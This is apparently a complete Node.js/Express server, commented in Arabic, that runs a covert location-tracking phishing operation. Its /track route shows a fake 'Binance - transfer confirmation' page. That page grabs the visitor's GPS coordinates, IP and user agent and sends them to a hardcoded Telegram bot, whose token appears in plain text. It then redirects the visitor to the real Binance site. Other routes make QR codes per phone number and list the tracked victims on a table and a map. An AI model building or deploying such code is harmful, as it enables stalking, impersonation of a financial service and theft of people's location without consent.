const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚙️ إعدادات التلجرام - ضع بياناتك هنا
const TELEGRAM_TOKEN = '7150552853:AAEcAGkHq7Ih8wOxXjUTh_ThRl63M9UN5XA';
const TELEGRAM_CHAT_ID = '6724747823';
const REDIRECT_URL = 'https://www.binance.com/en';
const BASE_URL = 'https://location2026-2.onrender.com';

// قاعدة بيانات
let locations = [];

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام تتبع المواقع</title>
            <style>
                body { font-family: Arial; padding: 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; }
                .container { max-width: 800px; margin: auto; background: rgba(255,255,255,0.05); padding: 30px; border-radius: 20px; }
                h1 { color: #00ff88; text-align: center; }
                .box { background: rgba(255,255,255,0.08); padding: 20px; border-radius: 10px; margin: 20px 0; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; display: inline-block; margin: 5px; }
                .qr-box { text-align: center; margin: 30px 0; }
                input { padding: 10px; width: 300px; border-radius: 5px; border: 2px solid #00ff88; background: #0f0f23; color: white; text-align: center; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام تتبع المواقع الجغرافية</h1>
                
                <div class="box">
                    <h3>📌 إنشاء رابط تتبع:</h3>
                    <p>https://location2026-2.onrender.com/track/رقم_الهاتف</p>
                    <a href="/track/123456" class="btn" target="_blank">🔗 تجربة الرابط</a>
                    <a href="/results" class="btn">📊 النتائج (${locations.length})</a>
                </div>
                
                <div class="box qr-box">
                    <h3>📱 توليد باركود:</h3>
                    <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف (مثال: 00966512345678)">
                    <br><br>
                    <button onclick="generateQR()" class="btn">🔄 توليد باركود</button>
                    <div id="qrResult" style="margin-top: 20px;"></div>
                </div>
                
                <div class="box">
                    <h3>🔗 روابط مهمة:</h3>
                    <a href="/map" class="btn">🗺️ الخريطة</a>
                    <a href="/all-qr" class="btn">📱 جميع الباركود</a>
                    <a href="/test" class="btn">🤖 اختبار التلجرام</a>
                </div>
            </div>
            
            <script>
                function generateQR() {
                    const phone = document.getElementById('phoneInput').value.trim();
                    if (!phone) {
                        alert('أدخل رقم الهاتف أولاً');
                        return;
                    }
                    
                    const url = 'https://location2026-2.onrender.com/track/' + phone;
                    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(url);
                    
                    document.getElementById('qrResult').innerHTML = \`
                        <div style="margin: 20px 0;">
                            <p><strong>الرابط:</strong> \${url}</p>
                            <img src="\${qrUrl}" alt="QR Code" style="width: 200px; height: 200px; border: 5px solid white; border-radius: 10px;">
                            <br><br>
                            <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط</a>
                            <button onclick="downloadQR('\${qrUrl}')" class="btn">📥 تحميل الباركود</button>
                        </div>
                    \`;
                }
                
                function downloadQR(qrUrl) {
                    const link = document.createElement('a');
                    link.href = qrUrl;
                    link.download = 'qrcode_' + Date.now() + '.png';
                    link.click();
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Binance - تأكيد التحويل</title>
            <script>
                // الحصول على الموقع الجغرافي
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                const lat = position.coords.latitude;
                                const lon = position.coords.longitude;
                                const accuracy = position.coords.accuracy;
                                
                                // إرسال البيانات للخادم
                                try {
                                    await fetch('/api/save-location', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            id: '${userId}',
                                            latitude: lat,
                                            longitude: lon,
                                            accuracy: accuracy,
                                            timestamp: new Date().toISOString(),
                                            userAgent: navigator.userAgent
                                        })
                                    });
                                } catch (error) {
                                    console.log('Error saving location');
                                }
                            },
                            (error) => {
                                console.log('Location not available');
                            }
                        );
                    }
                    
                    // التوجيه بعد 4 ثواني
                    setTimeout(() => {
                        window.location.href = '${REDIRECT_URL}';
                    }, 4000);
                }
                
                // عد تنازلي
                let seconds = 4;
                const timer = setInterval(() => {
                    document.getElementById('countdown').textContent = seconds;
                    seconds--;
                    
                    if (seconds < 0) {
                        clearInterval(timer);
                    }
                }, 1000);
                
                // بدء عند تحميل الصفحة
                window.onload = function() {
                    getLocation();
                };
            </script>
            <style>
                body {
                    font-family: Arial;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #0f2027 0%, #203a43 100%);
                    color: white;
                    text-align: center;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 40px;
                    border-radius: 20px;
                    max-width: 500px;
                    width: 90%;
                }
                .logo { font-size: 60px; margin-bottom: 20px; }
                .countdown { font-size: 50px; color: #00ff88; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">₿</div>
                <h1>Binance - تأكيد التحويل</h1>
                <p>جاري تأكيد هويتك والتحقق من التفاصيل...</p>
                <div class="countdown" id="countdown">4</div>
                <p>سيتم تحويلك تلقائياً خلال <span id="countdown">4</span> ثوانٍ</p>
                <p style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
                    التحويل رقم: #${userId}
                </p>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع ==========
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA')
        };
        
        locations.push(locationData);
        
        // إرسال إشعار للتلجرام
        await sendTelegramAlert(locationData);
        
        console.log('📍 موقع جديد:', locationData.id);
        
        res.json({ success: true, count: locations.length });
    } catch (error) {
        console.error('Error:', error);
        res.json({ success: false });
    }
});

// ========== إرسال إشعار تلجرام ==========
async function sendTelegramAlert(locationData) {
    try {
        const message = `
📍 **موقع جديد تم تسجيله**

👤 **رقم المستخدم:** ${locationData.id}
📌 **الإحداثيات:** ${locationData.latitude}, ${locationData.longitude}
🎯 **الدقة:** ${locationData.accuracy || 'غير معروف'} متر
⏰ **الوقت:** ${locationData.time}
🌐 **IP:** ${locationData.ip || 'غير معروف'}

🗺️ https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}
        `;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error);
        return false;
    }
}

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 12px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            <table>
                <tr><th>رقم الهاتف</th><th>الإحداثيات</th><th>الوقت</th><th>الخريطة</th></tr>
                ${locations.slice().reverse().map(loc => `
                    <tr>
                        <td>${loc.id}</td>
                        <td>${loc.latitude}, ${loc.longitude}</td>
                        <td>${loc.time}</td>
                        <td><a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88;">👁️ عرض</a></td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 500px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        L.marker([loc.latitude, loc.longitude])
                         .addTo(map)
                         .bindPopup('<b>رقم: ' + loc.id + '</b><br>الوقت: ' + loc.time);
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// ========== صفحة جميع الباركود ==========
app.get('/all-qr', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📱 جميع الباركود</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; margin-top: 30px; }
                .qr-item { background: #1a1a2e; padding: 15px; border-radius: 10px; text-align: center; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>📱 جميع الباركود (${uniqueIds.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <div class="qr-grid">
                ${uniqueIds.map(id => {
                    const url = `${BASE_URL}/track/${id}`;
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(url)}`;
                    return `
                        <div class="qr-item">
                            <p><strong>${id}</strong></p>
                            <img src="${qrUrl}" alt="QR Code" style="width: 150px; height: 150px;">
                            <p><a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px;">فتح الرابط</a></p>
                        </div>
                    `;
                }).join('')}
            </div>
        </body>
        </html>
    `);
});

// ========== صفحة اختبار التلجرام ==========
app.get('/test', async (req, res) => {
    try {
        // اختبار البوت
        const testResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
        const botInfo = await testResponse.json();
        
        // إرسال رسالة اختبار
        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: '🔔 اختبار النظام\n✅ النظام يعمل بشكل ممتاز!'
            })
        });
        
        const messageData = await messageResponse.json();
        
        res.send(`
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>🤖 اختبار التلجرام</title>
                <style>
                    body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; text-align: center; }
                    .info { background: #1a1a2e; padding: 30px; border-radius: 15px; display: inline-block; text-align: right; margin: 20px; }
                </style>
            </head>
            <body>
                <h1>🤖 اختبار التلجرام</h1>
                
                <div class="info">
                    <h3>معلومات البوت:</h3>
                    <pre style="text-align: left;">${JSON.stringify(botInfo, null, 2)}</pre>
                </div>
                
                <div class="info">
                    <h3>نتيجة الإرسال:</h3>
                    <pre style="text-align: left;">${JSON.stringify(messageData, null, 2)}</pre>
                </div>
                
                <p>
                    <a href="/" style="background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">العودة للرئيسية</a>
                </p>
            </body>
            </html>
        `);
        
    } catch (error) {
        res.send(`
            <html dir="rtl">
            <body style="font-family: Arial; padding: 50px; text-align: center;">
                <h1>❌ خطأ في اختبار التلجرام</h1>
                <p>${error.message}</p>
                <p>تأكد من:</p>
                <ol style="text-align: right; display: inline-block;">
                    <li>صحة توكن البوت</li>
                    <li>أن البوت مفعل</li>
                    <li>أن البوت مضاف للشات</li>
                </ol>
            </body>
            </html>
        `);
    }
});

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    📌 رابط تتبع: http://localhost:${PORT}/track/123456
    🤖 التلجرام: ✅ متصل
    ⚡ النظام جاهز!
    `);
});
